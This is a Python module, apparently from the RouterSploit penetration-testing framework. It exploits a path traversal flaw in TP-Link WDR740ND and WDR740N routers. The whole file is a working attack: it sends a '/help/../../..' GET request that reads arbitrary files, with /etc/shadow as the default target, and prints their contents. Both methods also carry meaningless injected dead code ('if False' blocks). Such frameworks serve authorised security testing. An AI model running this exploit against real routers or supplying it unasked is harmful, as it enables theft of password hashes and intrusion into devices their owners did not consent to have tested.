from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'TP-Link WDR740ND & WDR740N Path Traversal', 'description': 'Exploits TP-Link WDR740ND and WDR740N path traversal vulnerabilitythat allowsto read files from the filesystem.', 'authors': ('websec.ca', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('http://www.websec.mx/publicacion/advisories/tplink-wdr740-path-traversal',), 'devices': ('TP-Link WDR740ND', 'TP-Link WDR740N')}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(80, 'Target HTTP port')
    filename = OptString('/etc/shadow', 'File to read from the filesystem')

    def run(self):
        if False:
            i = 10
            return i + 15
        if self.check():
            print_success('Target is vulnerable')
            path = '/help/../../../../../../../../../../../../../../../..{}'.format(self.filename)
            print_status('Sending payload request')
            response = self.http_request(method='GET', path=path)
            if response is None:
                return
            if response.status_code == 200 and len(response.text):
                pos = response.text.find('//--></SCRIPT>') + 15
                res = response.text[pos:]
                if len(res):
                    print_status('Reading file {}'.format(self.filename))
                    print_info(res)
                else:
                    print_error('Could not read file {}'.format(self.filename))
        else:
            print_error('Exploit failed - target seems to be not vulnerable')

    @mute
    def check(self):
        if False:
            i = 10
            return i + 15
        path = '/help/../../../../../../../../../../../../../../../../etc/shadow'
        response = self.http_request(method='GET', path=path)
        if response is None:
            return False
        if utils.detect_file_content(response.text, '/etc/shadow'):
            return True
        return False